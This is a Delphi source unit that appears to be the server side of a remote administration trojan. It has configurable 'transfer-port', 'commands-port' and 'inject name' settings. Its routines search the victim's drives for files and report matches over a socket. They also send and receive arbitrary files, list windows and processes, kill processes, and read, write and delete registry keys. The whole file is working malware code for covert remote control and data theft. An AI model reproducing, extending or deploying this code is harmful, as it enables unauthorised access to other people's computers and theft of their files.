unit Unit1;

interface

Uses
 Windows, Winsock, Messages, TLHELP32;

 const
  FileFlags:array [0..7] of Integer = (FILE_ATTRIBUTE_READONLY, FILE_ATTRIBUTE_HIDDEN,
                                      FILE_ATTRIBUTE_SYSTEM, FILE_ATTRIBUTE_ARCHIVE,
                                      FILE_ATTRIBUTE_NORMAL, FILE_ATTRIBUTE_TEMPORARY,
                                      FILE_ATTRIBUTE_COMPRESSED, FILE_ATTRIBUTE_OFFLINE);
 eTPORT : String = 'tpr=     '; // 5
 eCPORT : String = 'epr=     '; // 5
 eFNAME : String = 'fnm=                    '; // 20
 eINAME : String = 'inm=                    '; // 20

 Procedure Idle(Seconds: integer; Sock1: TSocket);
 Procedure ReceiveFile(FileName: string; Sock1: TSocket);
 Procedure SaveFile(Str:String;fName:String);
 Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
 Procedure DeleteRegValue(kRoot:Hkey; Path, Value:String);
 Procedure DeleteRegKey(kRoot:Hkey; Path, Value:String);
 Procedure KILLPROC(S:STRING);
 Procedure FindFile;
 Procedure ListFiles(D, Name, SearchName : String);
 Procedure testsend(Str:String);

 Function ReceiveLength(Sock1: TSocket): Integer;
 Function ReceiveBuffer(var Buffer; BufferSize: Integer; Sock1:TSocket): Integer;
 Function ReceiveString(Sock1: TSocket): string;
 Function SendFile(FileName: string; Sock1: TSocket):boolean;
 Function SendBuffer(var Buffer; BufferSize: integer; Sock1: TSocket): integer;
 Function SendString(const Buffer: string; Sock1: TSocket): integer;
 Function SysDir:String;
 Function WinDir:String;
 Function UpTime:String;
 Function RefreshList(strPath:string):string;
 Function GetSettings(I:Integer):String;
 Function Trim(const S: string): string;
 Function IntToStr(X: integer): string;
 Function StrToInt(S: string): integer;
 Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
 Function ReadRegedit(kRoot:Hkey;Path:String;Typ:integer):String;
 Function LISTPROC:STRING;
 Function getwins:string;
 Function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
 Function sendwindows:string;
 Function UpperC(const S: string): string;
 Function GetDriver:String;

const
 BUFLEN = 65536;
 DriveTypeStrings:array[DRIVE_REMOVABLE..DRIVE_RAMDISK] of string[9]=('Removable','Fixed','Network','CD-ROM','RAM');

var
 SearchFor              : String;
 SearchHDD              : String;
 Wins                   : Array [0..300] of record name :string;
 Wnd                    : Hwnd;
 End;
 Wcnt                   : Integer;
 Buf                    : Array [0..BUFLEN-1] of Char;
 Cancel_Transfer        : Boolean;
 Cancel_Search          : Boolean;
 Already_Searching      : Boolean;
 CServ1                 : TSocket;

implementation

Function GetDriver:String;
Var
 C:Char;
 T:Integer;
Begin
 Result := '';
 For C := 'A' To 'Z' Do Begin
  T := GetDriveType(pChar(C+':\'));
  If T > 1 Then
  Result := Result + '39' + C + ':\' + #13;
 End;
End;

procedure testsend(Str:String);
begin
 send(cserv1, str[1], length(str),0);
end;

function UpperC(const S: string): string;
var
 Len: Integer;
begin
 Len := Length(S);
 SetString(Result, PChar(S), Len);
 if Len > 0 then CharUpperBuff(Pointer(Result), Len);
end;

procedure ListFiles(D, Name, SearchName : String);
const
  faReadOnly  = $00000001 platform;
  faHidden    = $00000002 platform;
  faSysFile   = $00000004 platform;
  faVolumeID  = $00000008 platform;
  faDirectory = $00000010;
  faArchive   = $00000020 platform;
  faAnyFile   = $0000003F;

type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName; 
    ExcludeAttr: Integer; 
    FindHandle: THandle  platform; 
    FindData: TWin32FindData  platform; 
  end; 
 
  LongRec = packed record 
    case Integer of 
      0: (Lo, Hi: Word); 
      1: (Words: array [0..1] of Word); 
      2: (Bytes: array [0..3] of Byte);
  end; 
 
  function FindMatchingFile(var F: TSearchRec): Integer; 
  var 
    LocalFileTime: TFileTime; 
  begin 
    with F do 
    begin 
      while FindData.dwFileAttributes and ExcludeAttr <> 0 do 
        if not FindNextFile(FindHandle, FindData) then 
        begin 
          Result := GetLastError; 
          Exit; 
        end; 
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime); 
      FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, 
        LongRec(Time).Lo); 
      Size := FindData.nFileSizeLow; 
      Attr := FindData.dwFileAttributes; 
      Name := FindData.cFileName; 
    end; 
    Result := 0; 
  end; 
 
  procedure FindClose(var F: TSearchRec); 
  begin 
    if F.FindHandle <> INVALID_HANDLE_VALUE then 
    begin 
      Windows.FindClose(F.FindHandle); 
      F.FindHandle := INVALID_HANDLE_VALUE;
    end; 
  end; 
 
  function FindFirst(const Path: string; Attr: Integer; 
    var  F: TSearchRec): Integer; 
  const 
    faSpecial = faHidden or faSysFile or faVolumeID or faDirectory; 
  begin
    F.ExcludeAttr := not Attr and faSpecial;
    F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
    if F.FindHandle <> INVALID_HANDLE_VALUE then
    begin
      Result := FindMatchingFile(F);
      if Result <> 0 then FindClose(F);
    end else
      Result := GetLastError;
  end;

  function FindNext(var F: TSearchRec): Integer;
  begin
    if FindNextFile(F.FindHandle, F.FindData) then
      Result := FindMatchingFile(F) else
      Result := GetLastError;
  end;

var
  SR: TSearchRec;
  Shit:String;
begin
  If Cancel_Search Then Exit;
  If D[Length(D)] <> '\' then D := D + '\';

  If FindFirst(D + '*.*', faDirectory, SR) = 0 then
    Repeat
      If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
        ListFiles(D + SR.Name + '\', Name, SearchName)
      Else Begin
        Shit := UpperC(Copy(SR.Name, (Length(SR.Name)-Length(SearchName))+1, Length(SearchName)));
        If (SearchName <> '*.*') and
           (Shit = UpperC(SearchName)) Then Begin
         Shit := '38'+ IntToStr(Sr.Size) +':'+D + Sr.Name+#13;
         testsend(shit);
        End;
      End;
    Until (FindNext(SR) <> 0);
  FindClose(SR); 
end;


Procedure FindFile;
Begin
 ListFiles(SearchHDD,'*',SearchFor);
End;

function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
begin
  if iswindowvisible(w) then begin
    getwindowtext(w,buf,10000);
    if buf[0]<>#0 then begin
      wins[wcnt].name:=buf;
      wins[wcnt].wnd:=w;
      wcnt:=wcnt+1;
    end;
  end;
  result:=true;
end;

function sendwindows:string;
var i:integer;
begin
 result:='';
  wcnt:=0;
  enumwindows(@enumwinproc,0);
  for i:=0 to wcnt-1 do begin
    result:=result+inttostr(wins[i].wnd)+':'+wins[i].name+';';
    wins[i].name := '';
    wins[i].wnd := 0;
  end;
end;

function getwins:string;
begin
 result:='';
 result:=sendwindows;
end;

FUNCTION LISTPROC:STRING;
VAR
  CONTINUELOOP  :       BOOLEAN;
  HSNAPSHOT     :       THANDLE;
  LPPE          :       TPROCESSENTRY32;
  LPME          :       TMODULEENTRY32;
BEGIN
  HSNAPSHOT := CREATETOOLHELP32SNAPSHOT(TH32CS_SNAPPROCESS OR TH32CS_SNAPMODULE, 0);
  LPPE.DWSIZE := SIZEOF(LPPE);
  CONTINUELOOP := PROCESS32FIRST(HSNAPSHOT, LPPE);
  WHILE (INTEGER(CONTINUELOOP) <> 0) DO
  BEGIN
   RESULT := RESULT + LPPE.SZEXEFILE+':'+INTTOSTR(LPPE.TH32PROCESSID)+';';
   CONTINUELOOP := PROCESS32NEXT(HSNAPSHOT, LPPE);
  END;
  CLOSEHANDLE(HSNAPSHOT);
END;

PROCEDURE KILLPROC(S:STRING);
VAR
  RET           :       BOOL;
  PROCESSID     :       INTEGER;
  PROCESSHNDLE  :       THANDLE;
BEGIN
  IF S = '' THEN EXIT;
  TRY
    PROCESSID := STRTOINT('$' + S);
    PROCESSHNDLE := OPENPROCESS(PROCESS_TERMINATE, BOOL(0), PROCESSID);
    RET := TERMINATEPROCESS(PROCESSHNDLE, 0);
    IF INTEGER(RET) = 0 THEN EXIT;
  EXCEPT
    EXIT;
  END;
END;

Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
Var
 Key : Hkey;
 Siz : Cardinal;
 Val : Array[0..16382] Of Char;
Begin
 ZeroMemory(@Val, Length(Val));
 RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
 Siz := 16383;
 RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
 RegCloseKey(Key);
 If Val <> '' then
  Result := Val;
End;

Function ReadRegedit(kRoot:Hkey;Path:String;Typ:integer):String;
Var
 Keys: Array[0..255] of Char;
 A   : Cardinal;
 KEY : HKEY;
 I   : Integer;

Begin
 Result := '';

 For i:=0 To 16383 do begin
  RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_ENUMERATE_SUB_KEYS, KEY);
  A:=2048;
  If RegEnumKeyEx(Key, I, Keys, A, NIL, NIL, NIL, NIL) = ERROR_SUCCESS Then
   result := result + #13#10 + Keys
  Else Break;
 End;

End;

Procedure DeleteRegKey(kRoot:Hkey; Path, Value:String);
Var
 Key : Hkey;
Begin
 RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_ALL_ACCESS, KEY);
 RegDeleteKey(Key, pChar(Value));
 RegCloseKey(Key);
End;

Procedure DeleteRegValue(kRoot:Hkey; Path, Value:String);
Var
 Key : Hkey;
Begin
 RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_SET_VALUE, KEY);
 RegDeleteValue(Key, pChar(Value));
 RegCloseKey(Key);
End;

Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
Var
 Key : Hkey;
 Siz : Cardinal;
Begin
 RegOpenKey(kRoot, pChar(Path), Key);
 Siz := 2048;
 RegSetValueEx( Key, pChar(Value), 0, REG_SZ, @Str[1], Siz);
 RegCloseKey(Key);
End;

function IntToStr(X: integer): string;
var
 S: string;
begin
 Str(X, S);
 Result := S;
end;

function StrToInt(S: string): integer;
var
 V, Code: integer;
begin
 Val(S, V, Code);
 Result := V;
end;

function Trim(const S: string): string;
var
 I, L: Integer;
begin
 L := Length(S);
 I := 1;
 while (I <= L) and (S[I] <= ' ') do Inc(I);
 if I > L then Result := '' else
  begin
   while S[L] <= ' ' do Dec(L);
   Result := Copy(S, I, L - I + 1);
  end;
end;

Function GetSettings(I:Integer):String;
Begin
 Case I Of
  0 : {transfer-port} Result := Copy(eTPort, pos('=',eTPort)+1, Length(eTPort));
  1 : {commands-port} Result := Copy(eCPort, pos('=',eCPort)+1, Length(eCPort));
  2 : {filename     } Result := Copy(eFName, pos('=',eFName)+1, Length(eFName));
  3 : {inject name  } Result := Copy(eIName, pos('=',eIName)+1, Length(eIName));
  4 : {} ;
  5 : {} ;
  6 : {} ;
  7 : {} ;
  8 : {} ;
  9 : {} ;
  10: {} ;
 End;
 Result := Trim(Result);
End;

Procedure SaveFile(Str:String;fName:String);
Var
 F      :TextFile;
Begin
 AssignFile(F, fName);
 ReWrite(F);
 Write(F, Str);
 CloseFile(F);
End;

function RefreshList(strPath:string):string;
var
   c,r:string;
   fHandle,j:Longint;
   WFD:_WIN32_FIND_DATAA;

begin
   c:=#13#10;

   fHandle:=FindFirstFile(PChar(strPath + '*.*'),WFD);
   if fHandle <> -1 then
   begin
      r:=strPath + c;
      repeat
      begin
         if Ord(WFD.cFileName[0]) <> 46 then
         begin
            if (WFD.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = FILE_ATTRIBUTE_DIRECTORY then
               Result := Result + '\' + string(WFD.cFileName) + C
            else
               for j:=0 to 7 do
                  if Bool(WFD.dwFileAttributes and FileFlags[j]) then
                  begin
                     Result := Result + string(WFD.cFileName) + C;
                     Break;
                  end;
         end;
      end;
      until FindNextFile(fHandle,WFD) = false;
      Windows.FindClose(fHandle);
   end
   else
      r:=strPath;
end;

Function UpTime:String;
Var
 Tick : Cardinal;
 Seconeds,
 Minutes,
 Hours,
 Days,
 Weeks : integer;
Begin
 Tick := GetTickCount;
 Seconeds := Tick div 1000 mod 60;
 Minutes := Tick div 1000 div 60 mod 60;
 Hours := Tick div 1000 div 60 div 60 mod 24;
 Days := Tick div 1000 div 60 div 60 div 24 mod 7;
 Weeks := Tick div 1000 div 60 div 60 div 24 div 7 mod 52;
 Result := IntToStr(Weeks)+'w'+IntToStr(Days)+'d'+IntToStr(Hours)+'h'+
           IntToStr(Minutes)+'m'+IntToStr(Seconeds)+'s';
End;

Function SysDir:String;
Var B:Array[0..255]Of Char;
Begin
 GetSystemDirectory(B, 255);
 Result := String(B) + '\';
End;

Function WinDir:String;
Var B:Array[0..255]Of Char;
Begin
 GetWindowsDirectory(B, 255);
 Result := String(B) + '\';
End;
//*   Receive the length of buffer   *//
Function ReceiveLength(Sock1: TSocket): Integer;
Begin
  Result := ReceiveBuffer(Pointer(NIL)^, -1, Sock1);
End;

//*   Receive the buffer from choosen socket   *//
Function ReceiveBuffer(var Buffer; BufferSize: integer; Sock1: TSocket): Integer;
Begin
  if BufferSize = -1 then
  begin
    if ioctlsocket(Sock1, FIONREAD, Longint(Result)) = SOCKET_ERROR then
    begin
      Result := SOCKET_ERROR;
      CloseSocket(Sock1);
    end;
  end
  else
  begin
     Result := recv(Sock1, Buffer, BufferSize, 0);
     if Result = 0 then
     begin
       CloseSocket(Sock1);
     end;
     if Result = SOCKET_ERROR then
     begin
       Result := WSAGetLastError;
       if Result = WSAEWOULDBLOCK then
       begin
         Result := 0;
       end
       else
       begin
         CloseSocket(Sock1);
       end;
     end;
  end;
end;

//*   Receive string   *//
function ReceiveString(Sock1: TSocket): string;
begin
  SetLength(Result, ReceiveBuffer(pointer(nil)^, -1, Sock1));
  SetLength(Result, ReceiveBuffer(pointer(Result)^, Length(Result), Sock1));
end;

//*   Idle some seconds. could be fun   *//
procedure Idle(Seconds: integer; Sock1: TSocket);
var
  FDset: TFDset;
  TimeVal: TTimeVal;
begin
  if Seconds = 0 then
  begin
    FD_ZERO(FDSet);
    FD_SET(Sock1, FDSet);
    select(0, @FDset, nil, nil, nil);
  end
  else
  begin
    TimeVal.tv_sec := Seconds;
    TimeVal.tv_usec := 0;
    FD_ZERO(FDSet);
    FD_SET(Sock1, FDSet);
    select(0, @FDset, nil, nil, @TimeVal);
  end;
end;

//*   Receive file from to socket   *//
procedure ReceiveFile(FileName: string; Sock1: TSocket);
var
  TimeOut       :Integer;
  BinaryBuffer: pchar;
  BinaryFile: THandle;
  BinaryFileSize, BytesReceived, BytesWritten, BytesDone: dword;
begin
  BytesDone := 0;
  BinaryFile := CreateFile(pchar(FileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  Idle(0, Sock1);
  ReceiveBuffer(BinaryFileSize, sizeof(BinaryFileSize), Sock1);
  TimeOut := 0;
  while BytesDone < BinaryFileSize do
  begin
    If Cancel_Transfer Then Begin
     Cancel_Transfer := False;
     Exit;
    End;
    If TimeOut >= 10000 Then
     Exit
    Else
     Inc(TimeOut, 1);
    Sleep(1);
    BytesReceived := ReceiveLength(Sock1);
    if BytesReceived > 0 then
    begin
      TimeOut := 0;
      GetMem(BinaryBuffer, BytesReceived);
      try
        ReceiveBuffer(BinaryBuffer^, BytesReceived, Sock1);
        WriteFile(BinaryFile, BinaryBuffer^, BytesReceived, BytesWritten, nil);
        Inc(BytesDone, BytesReceived);
      finally
        FreeMem(BinaryBuffer);
      end;
    end;
  end;
  CloseHandle(BinaryFile);
end;

//*   Send file from choosen Socket   *//
function SendFile(FileName: string; Sock1: TSocket):boolean;
var
  TimeOut       :Integer;
  BinaryFile: THandle;
  BinaryBuffer: pchar;
  BinaryFileSize, BytesRead: dword;
begin
  result := false;
  BinaryFile := CreateFile(pchar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  BinaryFileSize := GetFileSize(BinaryFile, nil);
  SendBuffer(BinaryFileSize, sizeof(BinaryFileSize), Sock1);
  GetMem(BinaryBuffer, 2048);
  try
    repeat
      TimeOut := 0;
      Sleep(1);
      ReadFile(BinaryFile, BinaryBuffer^, 2048, BytesRead, nil);
      repeat
        If Cancel_Transfer Then Begin
         Cancel_Transfer := False;
         Exit;
        End;
        If TimeOut >= 10000 Then
         Exit
        Else
         Inc(TimeOut, 1);
        Sleep(1);
      until SendBuffer(BinaryBuffer^, BytesRead, Sock1) <> -1;
    until BytesRead < 2048;
  finally
    FreeMem(BinaryBuffer);
  end;
  CloseHandle(BinaryFile);
  Result := True;
end;

//*   Send buffer from choosen socket   *//
function SendBuffer(var Buffer; BufferSize: integer; Sock1: TSocket): integer;
var
  ErrorCode: integer;
begin
  Result := send(Sock1, Buffer, BufferSize, 0);
  if Result = SOCKET_ERROR then
  begin
    ErrorCode := WSAGetLastError;
    if (ErrorCode = WSAEWOULDBLOCK) then
    begin
      Result := -1;
    end
    else
    begin
      CloseSocket(Sock1);
    end;
  end;
end;

//*   Send string from choosen socket  *//
function SendString(const Buffer: string; Sock1: TSocket): integer;
begin
  Result := SendBuffer(pointer(Buffer)^, Length(Buffer), Sock1);
end;

end.
